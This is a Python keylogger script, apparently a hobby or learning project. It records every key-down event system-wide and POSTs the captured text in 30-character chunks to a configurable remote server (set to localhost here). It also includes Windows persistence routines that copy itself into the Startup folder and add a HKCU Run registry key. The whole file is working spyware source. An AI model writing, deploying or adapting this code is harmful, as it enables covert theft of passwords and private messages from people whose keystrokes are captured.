import keyboard
import requests
import os
import sys
import shutil

FILE_NAME = "keylog.txt"
REMOTE_SERVER_URL = "http://localhost:5000"
FILE_PATH = os.path.join(os.path.expanduser("~"), FILE_NAME)
REMOVE_FROM_STARTUP = False
ENABLE_ADD_TO_STARTUP = False
ENABLE_VERBOSE = True


def send_keylog(data):
    requests.post(REMOTE_SERVER_URL, data=data)
    # with open(FILE_PATH, "w") as f:
    #     f.write("")
    #    print("[+] File cleared")
    if ENABLE_VERBOSE:
        print("[+] Keylog sent")
        print("[+] Data sent: " + data)



def check_file(FILE_PATH):
    # create the file if it doesn't exist
    if not os.path.exists(FILE_PATH):
        with open(FILE_PATH, "w") as f:
            f.write("")
            if ENABLE_VERBOSE:
                print("[+] File created")

def write_to_file(FILE_PATH, data):
    with open(FILE_PATH, "a") as f:
        f.write(data)
        if ENABLE_VERBOSE:
            print("[+] Data written: " + data)

buffer = ""
def keylog():
    global buffer
    event = keyboard.read_event()
    if event.event_type == 'down':  # Only log the key down events
        buffer += event.name

    if len(buffer) >= 30:
        # write_to_file(FILE_PATH, buffer)
        send_keylog(data=buffer)
        buffer = ""

        
def define_connection():
    try:
        requests.get(REMOTE_SERVER_URL)
    except requests.exceptions.ConnectionError:
        if ENABLE_VERBOSE:
            print("[-] Connection error")
        sys.exit(1)
    else:
        if ENABLE_VERBOSE:
            print("[+] Connection established")

def add_to_startup():
    # Get the path to the current file
    current_file = os.path.realpath(__file__)
    # Get the path to the startup folder
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    # Copy the current file to the startup folder
    shutil.copy(current_file, startup_folder)
    if ENABLE_VERBOSE:
        print("[+] Added to startup")
    # add to registry
    os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /t REG_SZ /d " + current_file)

def remove_from_startup():
    # Get the path to the current file
    current_file = os.path.realpath(__file__)
    # Get the path to the startup folder
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    # Remove the current file from the startup folder
    os.remove(os.path.join(startup_folder, os.path.basename(current_file)))
    if ENABLE_VERBOSE:
        print("[-] Removed from startup")
    # remove from registry
    os.system("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /f")

def check_startup():
    current_file = os.path.realpath(__file__)
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if os.path.exists(os.path.join(startup_folder, os.path.basename(current_file))):
        if ENABLE_VERBOSE:
            print("[+] In startup")
        return True
    else:
        if ENABLE_VERBOSE:
            print("[-] Not in startup")
        return False

def main():
    # check_file(FILE_PATH)
    if ENABLE_VERBOSE:
        print("[+] Keylogger started")
        print("[+] File path: " + FILE_PATH)
    define_connection()
    if ENABLE_ADD_TO_STARTUP:
        if REMOVE_FROM_STARTUP:
            remove_from_startup()
        else:
            if not check_startup():
                add_to_startup()
    while True:
        keylog()

if __name__ == "__main__":
    main()
